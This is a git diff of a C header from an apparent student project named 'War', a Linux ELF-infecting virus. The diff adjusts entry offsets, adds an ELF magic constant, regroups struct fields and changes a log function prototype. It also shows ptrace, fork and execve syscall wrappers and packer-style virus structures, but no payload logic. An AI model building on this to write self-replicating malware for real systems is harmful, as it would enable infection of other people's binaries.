@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/12 15:36:33 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/12 20:48:34 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -34,10 +34,8 @@
 
 /* Define */
 
-// debug
-# define DEBUG
-
-# define SIGNATURE	0x216948	// 'Hi!'
+# define SIGNATURE			0x216948	// 'Hi!'
+# define ELF_MAGIC_NUMBER	1179403647
 
 # define USER_ENTRY	2
 # define ROOT_ENTRY	4
@@ -48,11 +46,13 @@
 # define BUFF_SIZE	0x1000
 # define PROG_INFO	512
 
+/* /!\ To remove debug log, look at the Makefile /!\ */
 # ifdef DEBUG
-#  define ENTRY_OFF	2461
+#  define ENTRY_OFF	2624
 # else
-#  define ENTRY_OFF	2453
+#  define ENTRY_OFF	2297
 # endif
+/* /!\ To remove debug log, look at the Makefile /!\ */
 
 # define __INLINE__	__attribute__((__always_inline__)) inline
 # define __PACKED__ __attribute__ ((__packed__))
@@ -60,7 +60,6 @@
 # define VERSION	"1.0"
 # define CREATED_BY	"War version "VERSION" (c)oded by Jle-Quel & DjeDt"
 # define CREATE_SZ	43
-
 
 /* Structures */
 typedef struct __PACKED__ linux_dirent64
@@ -116,17 +115,17 @@ typedef struct	s_data
 	t_virus		virus;
 	t_cypher	cypher;
 
-	// misc
+	// memory
 	Elf64_Ehdr	*header;
 	Elf64_Addr	bin_entry;
 	Elf64_Addr	vrs_entry;
 	Elf64_Addr	cpr_entry;
 
+	// misc
 	void		*name;
 	void		*rsp;
 	uint8_t		cpr_key[KEY_SIZE];
 	size_t		context;
-
 }				t_data;
 
 /* Core */
@@ -162,7 +161,7 @@ int				_strncmp(char *s1, char *s2, size_t n);
 size_t			_strlen(char *s);
 bool			check_name(char *str, int len);
 int				_ptrace(long request, long pid ,unsigned long addr, unsigned long data);
-void			_log(char *msg, size_t size);
+void			_log(char *msg, char *name, size_t msgsize, size_t context);
 pid_t			_fork(void);
 int				_execve(const char *filename, char *const argv[], char *const envp[]);
 int				_getppid(void);
